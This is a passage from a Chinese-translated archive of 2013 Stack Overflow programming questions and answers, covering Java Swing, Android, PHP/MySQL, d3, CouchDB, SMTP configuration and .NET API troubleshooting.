     * Main java runnable, required
     * @param args Unused, required by default
     */
    public static void main(String[] args)
    {
        Test game = new Test();

        JFrame frame = new JFrame("See guys, It's off centered... - 00.00.10");
        JPanel panel = new JPanel(new BorderLayout());
        panel.add(game, BorderLayout.CENTER);
        frame.setContentPane(panel);
        frame.pack();
        frame.isFocusable();
        frame.setFocusable(true);
        frame.setResizable(false);
        frame.setLocationRelativeTo(null);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);

        game.g = game.getGraphics();

        game.start(game);
    }

    private void loopUpdate(Test game)
    {
            game.repaint();
    }

    boolean done = true;
    public void paint(Graphics g)
    { 
        System.out.print(g.getClipBounds().width + ", " + g.getClipBounds().height + "\n");
        super.paint(g);
        g.setClip(0,0, WIN_WIDTH, WIN_HEIGHT);
        final Graphics2D g2d = (Graphics2D) g;
        if (done) 
        {
            done=false;

            try
            {

        g2d.fillRect(0, 0, WIN_WIDTH + 100, WIN_HEIGHT + 100);

        } catch (Exception e) {
                e.printStackTrace();
            }
            g.dispose();
            done = true;
    }
    }

    @Override
    public void run()
    {
        loopUpdate(this);
    }
} 
```

![这是输出](../Images/06d7d4e202dedb04c7284c851cf9c155.png)

请。我知道这里几乎每个人都知道如何解决这个问题，所以请有人可以帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T22:22:14.843

您假设 JPanel 的大小正好是 WIN_WIDTH 和 WIN_HEIGHT 的大小。使用`getBounds()`而不是常量来获取 JPanel 的实际实现大小。实际大小由容器的 LayoutManager 决定，因此如果您绝对需要指定的确切尺寸，您可以研究不同的布局管理器或绝对定位。

# git - JIRA + fisheye + git -> 如何修复丢失的链接？

> ID：15163629
> 
> 赞同：3
> 
> 时间：2013-03-01T17:37:48.300
> 
> 标签：git, jira, atlassian-fisheye

使用 Subversion、JIRA 和 fisheye 时，很容易编辑日志消息以修复 JIRA 编号。用 git，没那么多。一旦提交被推送到共享仓库，修改提交就很麻烦。

如果有人拼写错误和推送，这些产品中是否还有其他机制可以修复提交和 JIRA 之间的链接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T08:54:24.080

一种机制是使用钩子来防止输入错误。

本地 repo 上的预提交挂钩可以检查模式是否适合（但不检查远程 jira，因此您可以保持离线功能）。这可以防止开发人员在没有正确形成的 jira 引用的情况下提交。

服务器上的预接收或更新挂钩会进行更完整的检查（例如确保所有提交都有一个有效/打开/分配给它们的 jira 引用）。

这不是防弹的，但它应该足够好。

# android - 警报对话框未正确弹出。按钮导致异常。不确定为什么

> ID：15163630
> 
> 赞同：0
> 
> 时间：2013-03-01T17:37:53.710
> 
> 标签：android, button, dialog, alert

几乎所有东西都可以在我一直在研究的程序中运行。当我在 中进行更改时`UI`，一切都设置正确。由于我无法弄清楚的原因，当我按下我的 main 的 enter 按钮时，`UI`应用程序强制异常关闭。从日志...

> java.lang.IllegalStateException：在 id 为“enterButtonID”的视图类 android.widget.Button 上的 onClick 处理程序的活动类 com.loch.meaptracker.MainActivity 中找不到方法 enterMood(View)

这是程序代码。Eclipse 不会标记任何错误或警告。看着这个，我有点茫然，非常疲惫。任何帮助将不胜感激。

```
package com.loch.meaptracker;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import android.os.Bundle;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.DatePicker;
import android.widget.EditText;
import android.widget.SeekBar;
import android.widget.SeekBar.OnSeekBarChangeListener;
import android.widget.TimePicker;

public class MainActivity extends Activity implements OnSeekBarChangeListener {

private SeekBar happyBar, energyBar, anxietyBar, painBar;
private EditText noteField;
private DatePicker dPick;
private TimePicker tPick;
@SuppressWarnings("unused")
private Button enterButton;
private int happyValue = 4, energyValue = 4, anxietyValue = 4,
        painValue = 4;
private static final String TAG = "heapApp";
private String Mood = "Blah";
final Context context = this;

@Override
protected void onCreate(Bundle savedInstanceState) {
    try {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // bars
        happyBar = (SeekBar) findViewById(R.id.happinessBarID);
        happyBar.setOnSeekBarChangeListener(this);
        energyBar = (SeekBar) findViewById(R.id.energyBarID);
        energyBar.setOnSeekBarChangeListener(this);
        anxietyBar = (SeekBar) findViewById(R.id.anxietyBarID);
        anxietyBar.setOnSeekBarChangeListener(this);
        painBar = (SeekBar) findViewById(R.id.painBarID);
        painBar.setOnSeekBarChangeListener(this);
        // end bars
        dPick = (DatePicker) findViewById(R.id.datePicker1);
        tPick = (TimePicker) findViewById(R.id.timePicker1);
        noteField = (EditText) findViewById(R.id.noteTextFieldID);
        enterButton = (Button) findViewById(R.id.enterButtonID);
    } catch (Exception onCreateException) {
        Log.e(TAG, "Exception received", onCreateException);
    }
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}

// Bar listener methods
@Override
public void onProgressChanged(SeekBar arg0, int barValue, boolean hFromUser) {
    try {

        switch (arg0.getId()) {
        case R.id.happinessBarID:
            happyValue = barValue + 1;
            break;
        case R.id.energyBarID:
            energyValue = barValue + 1;
            break;
        case R.id.anxietyBarID:
            anxietyValue = barValue + 1;
            break;
        case R.id.painBarID:
            painValue = barValue + 1;
            break;
        }
        String debugBarValue = "Happy is " + happyValue + ", Energy is "
                + energyValue + ", Anxiety is " + anxietyValue
                + ", Pain is " + painValue + ".";
        System.out.println(debugBarValue);

    } catch (Exception BarValueException) {
        Log.e(TAG, "Exception received", BarValueException);
    }

}

@Override
public void onStartTrackingTouch(SeekBar happyBar) {
    // TODO Auto-generated method stub

}

@Override
public void onStopTrackingTouch(SeekBar happyBar) {
    // TODO Auto-generated method stub

}

// end Bar listener methods

// Enter Button listener Method

public void dialogPop(View v) {
    try {
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
                context);

        // set Title
        alertDialogBuilder.setTitle("title");

        // set dialog message
        alertDialogBuilder.setMessage("You entered: " + getMood())
                .setCancelable(false).setPositiveButton("Okay",
                // When Okay button clicked the write mood string to file
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,
                                    int id) {
                                try {
                                    // This is the string that should be
                                    // written to file
                                    String data = getMood();
                                    // This is the file that should be
                                    // written to
                                    File heapFile = new File("heapFile.csv");

                                    // if file doesn't exists, then create
                                    // it
                                    if (!heapFile.exists()) {
                                        heapFile.createNewFile();
                                    }

                                    // true = append file
                                    FileWriter heapFileWritter = new FileWriter(
                                            heapFile.getName(), true);
                                    BufferedWriter heapBufferWritter = new BufferedWriter(
                                            heapFileWritter);
                                    heapBufferWritter.write(data);
                                    heapBufferWritter.close();

                                    System.out.println("Done");

                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }

                        })
                // If they press either the cancel button or the back button
                // on their device (Same thing) then close the dialog and
                // give the user a chance to change what they've entered
                .setNegativeButton("Cancel",
                        new DialogInterface.OnClickListener() {

                            @Override
                            public void onClick(DialogInterface dialog,
                                    int id) {
                                // TODO Auto-generated method stub
                                dialog.cancel();
                            }
                        });

        // create alert dialog
        AlertDialog alertDialog = alertDialogBuilder.create();

        // show it
        alertDialog.show();
    } catch (Exception buttonListenerException) {
        Log.e(TAG, "Exception received", buttonListenerException);
    }
    return;
}

public String getMood() {
    try {
        int month = dPick.getMonth();
        int day = dPick.getDayOfMonth();
        int year = dPick.getYear();
        int minute = tPick.getCurrentMinute();
        String moodAntePost = "AM";
        boolean hourType = tPick.is24HourView();
        int moodHour = tPick.getCurrentHour();
        if (hourType == false && moodHour > 12) {
            moodHour = (moodHour - 12);
            moodAntePost = "PM";
        } else if (hourType == false && moodHour <= 0) {
            moodHour = 12;
        } else {
        }
        String noteText = noteField.getText().toString();
        Mood = "Happiness," + happyValue + ",Energy," + energyValue
                + ",Anxiety," + anxietyValue + ",Pain," + painValue
                + ",Date," + month + "/" + day + "/" + year + ",Time,"
                + moodHour + ":" + minute + "," + moodAntePost + ",Note,"
                + noteText;
        System.out.println(Mood);
    } catch (Exception getMoodException) {
        Log.e(TAG, "Exception received", getMoodException);
    }

    return Mood;
}

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:44:45.447

请检查 XML 代码。我认为在您的 XML 标记中，您添加了一个属性 android:onClick="enterMood".... 尝试删除它并运行它

利用

android:onClick="dialogPop" 代替

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:44:15.117

您的点击处理程序格式不正确。它需要包含一个视图参数，以便 XML 单击处理程序正常工作。

```
public void getMood(View view){

} 
```

# android - 每 10 秒启动一次服务

> ID：15163631
> 
> 赞同：0
> 
> 时间：2013-03-01T17:37:54.697
> 
> 标签：android, android-service, android-alarms

我有这个 android 服务，我试图每 10 秒获取一次信息，用于测试目的。但据我所知，服务正在启动，但不是每 10 秒更新一次。可能是什么问题？

这是我的服务：

```
public class SimpleService extends Service {
    private static final int NOVI_VESTI = 1;
    private static final int NOVA_OGLASNA = 2;
    private List<String> titles;

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
      public int onStartCommand(Intent intent, int flags, int startId) {
        //TODO do something useful
        return START_STICKY;
      }

    @Override
    public void onCreate() {
        super.onCreate();
        if (isOnline()) {
            if (getPrefs("vesti")!="") {
                String vesti, oglasna;
                Toast.makeText(this, "ima pref", Toast.LENGTH_SHORT).show();
                vesti = readRss("http://www.zasvadba.mk/Vesti.xml");
                if (!vesti.equals(getPrefs("vesti"))) {
                    Context context = SimpleService.this;
                    NotificationManager notificationManager = (NotificationManager) context
                            .getSystemService(NOTIFICATION_SERVICE);
                    Notification updateComplete = new Notification();
                    updateComplete.icon = R.drawable.ic_launcher;
                    updateComplete.tickerText = context
                            .getText(R.string.newVesti);
                    updateComplete.when = System.currentTimeMillis();
                    Intent notificationIntent = new Intent(context, Vesti.class);
                    PendingIntent contentIntent = PendingIntent.getActivity(
                            context, 0, notificationIntent, 0);

                    String contentTitle = context.getText(R.string.newVesti)
                            .toString();
                    String contentText;
                    contentText = vesti.toString();
                    updateComplete.setLatestEventInfo(context, contentTitle,
                            contentText, contentIntent);

                    notificationManager.notify(NOVI_VESTI, updateComplete);

                }

                oglasna = readRss("http://www.finki.ukim.mk/mk/rss/announcements");
                if (!oglasna.equals(getPrefs("oglasna"))) {

                    Context context = SimpleService.this;
                    NotificationManager notificationManager = (NotificationManager) context
                            .getSystemService(NOTIFICATION_SERVICE);
                    Notification updateComplete = new Notification();
                    updateComplete.icon = R.drawable.ic_launcher;
                    updateComplete.tickerText = context
                            .getText(R.string.newOglasna);
                    updateComplete.when = System.currentTimeMillis();
                    Intent notificationIntent = new Intent(context,
                            OglasnaTabla.class);
                    PendingIntent contentIntent = PendingIntent.getActivity(
                            context, 0, notificationIntent, 0);

                    String contentTitle = context.getText(R.string.newOglasna)
                            .toString();
                    String contentText;
                    contentText = vesti.toString();
                    updateComplete.setLatestEventInfo(context, contentTitle,
                            contentText, contentIntent);

                    notificationManager.notify(NOVA_OGLASNA, updateComplete);
                }
            }

        }

    }
    @Override
    public void onRebind(Intent intent) {
        super.onRebind(intent);
        Toast.makeText(this, "rebind", Toast.LENGTH_SHORT).show();

    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    // title for both
    public String readRss(String feedLink) {
        titles = new ArrayList<String>();
        try {
            URL url = new URL(feedLink);

            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(false);
            XmlPullParser xpp = factory.newPullParser();

            // We will get the XML from an input stream
            xpp.setInput(getInputStream(url), "UTF_8");

            boolean insideItem = false;

            // Returns the type of current event: START_TAG, END_TAG, etc..
            int eventType = xpp.getEventType();
            while (eventType != XmlPullParser.END_DOCUMENT) {
                if (eventType == XmlPullParser.START_TAG) {

                    if (xpp.getName().equalsIgnoreCase("item")) {
                        insideItem = true;
                    } else if (xpp.getName().equalsIgnoreCase("title")) {
                        if (insideItem)
                            titles.add(xpp.nextText());
                        // headlines.add(xpp.nextText()); // extract the
                    }
                } else if (eventType == XmlPullParser.END_TAG
                        && xpp.getName().equalsIgnoreCase("item")) {
                    insideItem = false;
                }

                eventType = xpp.next(); // move to next element
            }

        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (XmlPullParserException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return titles.get(0);
    }

    public InputStream getInputStream(URL url) {
        try {
            return url.openConnection().getInputStream();
        } catch (IOException e) {
            return null;
        }
    }

    private String getPrefs(String category) {
        SharedPreferences preferences = PreferenceManager
                .getDefaultSharedPreferences(this);
        String pref = preferences.getString(category, "");
        return pref;
    }

    private static boolean isOnline() {
        try {
            InetAddress.getByName("google.com").isReachable(3);
            return true;
        } catch (UnknownHostException e) {
            return false;
        } catch (IOException e) {
            return false;
        }
    }
} 
```

这是我的主要活动

```
Intent myIntent = new Intent(Main.this, SimpleService.class);
            pendingIntent = PendingIntent.getService(Main.this, 0, myIntent, 0);
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(System.currentTimeMillis());
            calendar.add(Calendar.SECOND, 10);
            alarmManager.set(AlarmManager.RTC_WAKEUP,
                    calendar.getTimeInMillis(), pendingIntent); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:46:09.873

设置闹钟重复 10 分钟你可以保持在毫秒 1000*60*10

```
alarmManager.setRepeating(AlarmManager.RTC, calendar.getTimeInMillis(), AlarmManager.INTERVAL_FIFTEEN_MINUTES, pendingIntent); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:51:02.967

方法是使用 a`Handle`并将您的活动放入其中：

```
new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
            Intent myIntent = new Intent(Main.this, SimpleService.class); 
        //etc.....
        }, 10*1000);
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:19:46.160

利用：

`alarmManager.setRepeating(AlarmManager.RTC, calendar.getTimeInMillis(),10000, pendingIntent);`

# asp.net-mvc - 新的 .NET 功能包和缩小 {version} 通配符不起作用

> ID：15163632
> 
> 赞同：1
> 
> 时间：2013-03-01T17:37:59.357
> 
> 标签：asp.net-mvc, bundling-and-minification

我正在尝试使用带有 {version} 通配符的捆绑。包含 {version} 的包不会显示在我呈现的页面的源代码中。此功能是否仅限于 .Net 4.5？由于一些基础设施问题，我只能使用 .Net 4.0。

**更新

我的 BundleConfig.cs 文件：

```
bundles.Add(new ScriptBundle("~/bundles/jquery").Include(
                    "~/Scripts/jquery-{version}.js"));      
bundles.Add(new ScriptBundle("~/bundles/jqueryui").Include(
                    "~/Scripts/jquery-ui-1.10.*")); 
```

第一个捆绑包不工作，第二个捆绑包正常工作。

jquery 文件路径是 /Scripts/jquery-1.9.1.js 和 /Scripts/jquery-1.9.1.min.js 这两个文件都存在，如果我使用“*”，则会引入适当的 jquery 文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:59:00.987

通过 NuGet 卸载并重新加载 Web 优化包。

# java - java使用pdfbox从msoffice转pdf

> ID：15163633
> 
> 赞同：1
> 
> 时间：2013-03-01T17:38:04.020
> 
> 标签：java, pdf, ms-office, apache-poi, pdfbox

是否可以使用 Apache PDFBox 从 MS Office 文件格式转换（文档对此并不清楚，并且 javadoc 似乎表明不存在此类功能），还是我需要使用 Apache POI 进行一些繁琐的转换？

我问的原因是这个 StackOverflow 问题的答案：

[https://stackoverflow.com/questions/10861227/convert-ms-office-to-pdf-in-java](https://stackoverflow.com/questions/10861227/convert-ms-office-to-pdf-in-java)

我想我需要使用 Apache POI，但我想澄清一下。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:55:16.197

为了进行这种转换，您将需要 MS Office，或者可能需要 Google Drive。PDFBox 不会从任何东西转换为 PDF，反之亦然——它只是读取和写入 PDF 文件。Apache POI 也不会进行这种类型的转换——它只是读写 MS Office 文件。具体来说，它不会渲染它们。您可以自己为每种类型的 Office 文件实现一个渲染引擎，但这至少可以说是一项艰巨的任务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-23T16:48:09.930

看看[https://angelozerr.wordpress.com/2012/12/06/how-to-convert-docxodt-to-pdfhtml-with-java/](https://angelozerr.wordpress.com/2012/12/06/how-to-convert-docxodt-to-pdfhtml-with-java/)。

它提到的可能选项之一是[XWPFConverterPDFViaIText](https://github.com/opensagres/xdocreport/wiki/XWPFConverterPDFViaIText)：

> org.apache.poi.xwpf.converter.pdf 提供基于[Apache POI XWPF](http://poi.apache.org/document/index.html)和[iText](https://softwarerecs.stackexchange.com/questions/18673/free-or-nearly-free-pdf-library-for-java/18683#18683)的 DOCX 2 Pdf 转换器。
> 
> [您可以使用 REST 转换器服务http://xdocreport-converter.opensagres.cloudbees.net/](http://xdocreport-converter.opensagres.cloudbees.net/)测试此转换器

# php - 如何缩短函数查询？

> ID：15163637
> 
> 赞同：0
> 
> 时间：2013-03-01T17:38:08.940
> 
> 标签：php, mysql, function

你好我有这个功能：

```
function mail_exists($email){
    global $db;
    $email = sanitize($email);
    $query = $db->query("SELECT Email FROM table1 WHERE Email= '$email' ");
    $check = $query->num_rows;
    $query2 = $db->query("SELECT Email FROM table2 WHERE Email= '$email' ");
    $check2 = $query->num_rows;
    return ($check > 0 || $check2 > 0) ? true : false;
} 
```

首先，我想知道如何通过仅使用一个查询来缩短它，第二件事是，为什么在使用两个查询时这不起作用？两个表都有不同的结构。在表 1 中，字段电子邮件为否。16 和表 2 是第 6 场。

多谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:47:00.990

首先，您`*here`在最后几行中犯了一个逻辑错误：`$query->num_rows;`应该是：`$query2->num_rows;`然后导致：

```
function mail_exists($email){
    global $db;
    $email = sanitize($email);
    $query = $db->query("SELECT Email FROM table1 WHERE Email= '$email' ");
    $check = $query->num_rows;
    $query2 = $db->query("SELECT Email FROM table2 WHERE Email= '$email' ");
    $check2 = $query2->num_rows; // *here
    return ($check > 0 || $check2 > 0) ? true : false;
} 
```

其次，如果您要处理两个完全不同的上下文，则应该使用两个不同的查询。不需要时不要加入查询。如果您只是计算行数，您可以轻松做到：

```
function mail_exists($email){
    global $db;
    $email = sanitize($email);
    $query = $db->query("SELECT COUNT(*) FROM table1 WHERE Email= '$email' ");
    $query2 = $db->query("SELECT COUNT(*) FROM table2 WHERE Email= '$email' ");
    $count1 = $query->fetch_row();
    $count2 = $query2->fetch_row();
    return ($count1[0] || $count2[0]);
} 
```

SQL`COUNT()`函数可以为您提供最高效的行数计数方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:39:11.387

使用 can`UNION ALL`返回总计数：

```
SELECT Email
FROM (
   SELECT Email FROM table1 WHERE Email= '$email'
   UNION ALL
   SELECT Email FROM table2 WHERE Email= '$email') t 
```

或者您可以使用`SELECT COUNT(Email)`返回计数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:43:03.647

你可以试试：

```
SELECT t1.Email from table1 t1 inner join table2 t2 on t2.Email=t1.Email WHERE t1.Email = '$email' 
```

进而：

```
return $query->num_rows > 0; 
```

我不是 PHP 专家，所以你的里程可能会有所不同。

# javascript - 使用 d3 对数刻度而不是线性刻度

> ID：15163640
> 
> 赞同：17
> 
> 时间：2013-03-01T17:38:22.530
> 
> 标签：javascript, d3.js, hierarchy, bar-chart

我正在尝试根据[http://mbostock.github.com/d3/talk/20111116/bar-hierarchy.html](http://mbostock.github.com/d3/talk/20111116/bar-hierarchy.html)制作图表，唯一的区别是我想使用对数刻度来表示 x-轴。

这是我的小提琴：http: [//jsfiddle.net/JhDVC/5/](http://jsfiddle.net/JhDVC/5/)

如您所见，x 轴在第 4 行定义：

```
x = d3.scale.linear().range([0, w]), 
```

如果我改变它

```
x = d3.scale.log().range([0, w]), 
```

然后它不起作用（没有渲染），抛出这些错误消息：

```
Error: Invalid value for <rect> attribute width="NaN" 
```

从更改域设置

```
x.domain([0, root.value]).nice(); 
```

至

```
x.domain([1, root.value]).nice(); 
```

向我显示 z 轴（名称），但仍然没有条形或值。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-01T18:09:40.283

还有一些其他地方设置了规模的域。您还需要更新这些。

[在这里](http://jsfiddle.net/JhDVC/7/)工作 jsfiddle 。

这是一些代码，以便我可以发布此代码：

```
x.domain([1, root.value]).nice(); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2017-02-15T23:24:07.150

您的范围包括零 - log(0) 未定义。

# php - 如何获取其中包含 sql 查询的 php 变量并使用 $db->updatePhoneNumbers() 将其添加到现有 sql 查询中？

> ID：15163641
> 
> 赞同：1
> 
> 时间：2013-03-01T17:38:31.430
> 
> 标签：php, mysql, sql, arrays

我正在尝试创建一个用户数据库。一个用户可以拥有不定数量的电话号码。因此，在表单中，我创建了一个 js 函数，它将为我提供新的输入字段，并将信息放入嵌套数组中。

我正在做一个双 foreach 循环来遍历我的数组，并根据 id 是否已经存在并且只需要更新或者它是全新的并且需要插入它来添加 SQL 查询。我将这些 SQL 查询添加到变量 $phoneSql 中。当我回显该变量时，它确实包含一个有效的 SQL 查询，如果我直接在 phpMyAdmin 中尝试它就可以工作。

这是 foreach 循环代码：

```
 $phoneSql = 'SELECT id FROM user WHERE id = '.$id.' INTO @id;';
 foreach($_POST['phone'] as $key => $value) {
    foreach($_POST['user'][$key] as $id => $number) {
        if($id == 0 && !$number == ''){
            $phoneSql .= 'INSERT INTO phone_number (id, user_id, number) VALUES (NULL, @id, "'.$number.'");';
            } else if (!$number == '') {
                $phoneSql .= 'UPDATE phone_numbers SET user_id = @id,  number = "'.$number.'" WHERE id = '.$id.';';
            } 
        }
    } 
```

我有一个带有表单的edit.php页面，该页面发布到update.php，其中我有上面的foreach循环和以下代码：

```
$db->updatePhoneNumber($phoneSql); 
```

它还从我正在编辑的用户那里获取 $id。然后它被发送到 db.php 并进入这个函数：

```
public function updatePhoneNumbers($phoneSql) {
    $ phoneSql = $ phoneSql;

    $sth = $this->dbh->prepare($phoneSql);
    $sth->execute();
    if ($sth->execute()) {
        return true;
    } else {
        return false;
    }
} 
```

但这不起作用。我可以将带有 sql 查询的变量添加到这样的函数中，还是必须以其他方式进行？我对此很陌生，所以我不确定如何进行。我已经尝试寻找解决方案，但没有找到任何解决方案。我很感谢任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:42:37.947

您应该做的是使用[`INSERT ... ON DUPLICATE KEY UPDATE ...`](http://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html)构造，为您节省大量逻辑。

例如

```
INSERT INTO phone_number (id, user_id, number) VALUES (...)
ON DUPLICATE KEY UPDATE user_id=VALUES(user_id), number=VALUES(number) 
```

有了这个，不需要选择，测试，然后插入/更新。您只需插入，如果发生重复键错误，MySQL 会透明地将其转换为更新。

# couchdb - 轻量级堆栈中的 CouchDB 安全性？

> ID：15163643
> 
> 赞同：2
> 
> 时间：2013-03-01T17:38:35.863
> 
> 标签：couchdb

我正在从事一个业余爱好者项目，以便更加熟悉 CouchDB。这是我第一次使用 CouchDB。对于这个项目，我的目标是调查是否可以使用 HTML、CSS、JavaScript、CouchDB 和 nginx 构建 Web 应用程序（即，我没有在 Couch 中托管任何代码，只是数据） .

这可能是非常不切实际的，但我首先想探索这个堆栈中的所有选项。

目前，我最大的问题是关于安全性。假设我在 CouchDB 中有几个数据库，每个数据库对应一个托管站点。对于此示例，我们将关注单个数据库——即单个站点。本网站的某些内容应该可供所有人使用，甚至是匿名用户；和其他东西应该只对具有特定角色的用户可用。我有哪些选择，每个选项的安全性如何？

到目前为止，我已经提出了一些想法，这是我计划在周末工作的一个：

1.  将用户和角色添加到`/{site_db}/_security`.
    *   [根据 Couch 文档](http://wiki.apache.org/couchdb/Security_Features_Overview)`{site_db}`，这样做将需要来自经过身份验证的用户的任何数据请求。
2.  添加一个名为 的用户`anon`，该用户只有一个角色，即`anon`.
3.  当用户第一次访问该站点时，我的 JS 模型将检查当前会话的状态 ( `GET /_session`)。
    *   如果不存在会话，则 JS 模型将使用该`anon`帐户进行身份验证。
4.  在我的设计文档中定义视图。
    *   应该只对非匿名用户可用的任何视图都应该检查`userCtx`对象上的角色。
    *   任何新创建的文档的验证都应检查`userCtx`用户的角色是否在白名单上。

这似乎应该可行，尽管我不禁认为它过于复杂，并且必须有更好的方法。另外，我不确定如何防止`anon`用户更新他自己的用户文档以添加更多角色。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T06:17:12.840

如果您不喜欢 CouchDB 安全模型，您可以在反向代理中轻松实现您的模型。

这是[Apache 的示例，](https://github.com/benel/Setting-up-LDAP/wiki#set-ldap-authentification-for-argos-steatite-or-cassandre)但在 nginx 中似乎[非常相似](http://wiki.apache.org/couchdb/Nginx_As_a_Reverse_Proxy#Authentication_with_reverse_proxy)。

# mysql - MySQL 超级权限错误 1227

> ID：15163645
> 
> 赞同：3
> 
> 时间：2013-03-01T17:38:37.800
> 
> 标签：mysql, database, phpmyadmin

我从本地机器导出了我的 SQL 表和视图。我试图将它导入我网站的机器。但我得到这个错误：`#1227 - Access denied; you need the SUPER privilege for this operation`

此查询给出了错误：

```
CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER 
VIEW `myview` AS select `my_table`.`id` AS `id`,`my_table`.`name` AS 
`name`,`my_table`.`surname` AS `surname` from `my_table` where 
((`my_table`.`name` = 'michael') and (`my_table`.`surname` = 'notyet')); 
```

导出表格和视图时应该选择什么？为了不得到这个错误？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T17:59:14.150

从单词`ALGORITHM`to中删除第一行中的所有内容`SECURITY DEFINER`，以便查询简单地显示为：

```
CREATE VIEW `myview` AS select ... 
```

尝试将`DEFINER`视图设置`root@localhost`为特权操作。

# email - smtp 使用另一个地址发送电子邮件

> ID：15163648
> 
> 赞同：1
> 
> 时间：2013-03-01T17:38:50.333
> 
> 标签：email, smtp, smtp-auth

大家好，我有一个站点，如果我想发送电子邮件，我必须使用以下配置设置 smtp：启用高级 Smtp **是**
Auth 模式 **登录**
用户 名**noreply@myserver.com**
密码 **密码**
Smtp 主机 **smtp.myserver.com**
Smtp 端口 **465**
使用SSL **是**

如果我想从另一个地址（如 test@test.it）发送我的 smtp 设置邮件，我该怎么做？因为我的客户在收到电子邮件时不想看到我的域，而是看到另一封电子邮件。有可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:51:28.463

您只需要一个带有中继功能的 SMTP 服务器。如果 smtp.myserver.com 有中继，那么您可以使用多种语言。您需要以这些语言中的任何一种修改 >MAIL From: 参数。

对于magento，修改：“/magento/app/code/core/Mage/Core/Model/Email.php”

然后在公共函数 send() 函数下你需要修改：

```
 ->setFrom($this->getFromEmail(), $this->getFromName()) 
```

并使用

```
 ->setFrom("test@test.com") 
```

# dynamics-crm-2011 - 帐户高级查找视图具有重复过滤器

> ID：15163649
> 
> 赞同：1
> 
> 时间：2013-03-01T17:38:52.477
> 
> 标签：dynamics-crm-2011

如果我创建一个新的帐户高级查找视图，我会发现一些非常奇怪的行为。

我遵循以下步骤：

*   为帐户创建新视图
*   转到标准
*   标准已预先填充如下

![在此处输入图像描述](../Images/56b1eeee6a9435861851ef35c39acae2.png)

这本身就很奇怪 - 为什么要预先填充？

无论如何，如果我再添加一些东西，比如说 `Status = Active` ，它会重复第一个标准，如下所示：

![在此处输入图像描述](../Images/a4fe6d5925d42622794f2a0954a9c847.png)

除了'你的服务器是FUBAR'd' - 任何人都有任何想法可能导致它？

编辑：如果我导出，XML 不会显示重复的过滤器，如下所示：

![在此处输入图像描述](../Images/43da6faa5081d9c28d2384d57cae7b47.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T16:29:44.887

Reply received from Microsoft. A colleague has verified this and found it fixed the issue in our case.

A filter had been applied to the default view for `Account` (I must admit I wasn't aware of this!).

When you click to create a new view, part of the code executed retrieves the current default view and uses that as a template.

**Removing all filters on the default view therefore solve this issue.**

I'm not quite sure why it should have had the affect it did when adding new criteria, but I think I'll choose not to think about that!

# .net - 尝试通过 .NET 连接到 Google Analytics API 会出现“400 Bad Request”

> ID：15163650
> 
> 赞同：0
> 
> 时间：2013-03-01T17:38:56.120
> 
> 标签：.net, vb.net, google-analytics-api

我正在尝试从 .NET 应用程序连接到 Google Analytics API。这是我想出的代码：

```
Public Function GetData() As String   
    Dim client As AssertionFlowClient = New AssertionFlowClient(GoogleAuthenticationServer.Description,
                                                                New X509Certificate2("C:\Users\xxxxx\privatekey.p12", "notasecret",
                                                                                     X509KeyStorageFlags.Exportable Or X509KeyStorageFlags.MachineKeySet)) With {
                                                                .Scope = "analytics.readonly",
                                                                .ServiceAccountId = "xxxxx@developer.gserviceaccount.com"}
    Dim authenticator As OAuth2Authenticator(Of AssertionFlowClient) = New OAuth2Authenticator(Of AssertionFlowClient)(client, AddressOf AssertionFlowClient.GetState)
    Dim service As AnalyticsService = New AnalyticsService(authenticator)

    Dim profileId As String = "ga:xxxxx"
    Dim startDate As String = "2013-02-15"
    Dim endDate As String = "2013-02-20"
    Dim metrics As String = "ga:visitors"

    Dim request As DataResource.GaResource.GetRequest = service.Data.Ga.Get(profileId, startDate, endDate, metrics)
    Dim data As GaData = request.Fetch()

    Return data.ToString()
End Function 
```

